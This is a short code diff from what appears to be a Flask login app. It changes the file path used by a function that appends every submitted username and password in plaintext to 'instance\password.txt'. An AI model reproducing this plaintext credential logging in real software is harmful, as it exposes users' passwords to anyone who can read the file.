@@ -16,7 +16,7 @@ login_manager.login_view = 'login'
 def write_to_file(username, password):
     try:
         # Use raw string for file path to avoid issues with backslashes
-        file_path = r'D:\SP\vincent-main\vincent-main\instance\password.txt'
+        file_path = r'instance\password.txt'
         with open(file_path, 'a') as file:
             file.write(f"Username: {username}, Password: {password}\n")
     except Exception as e:
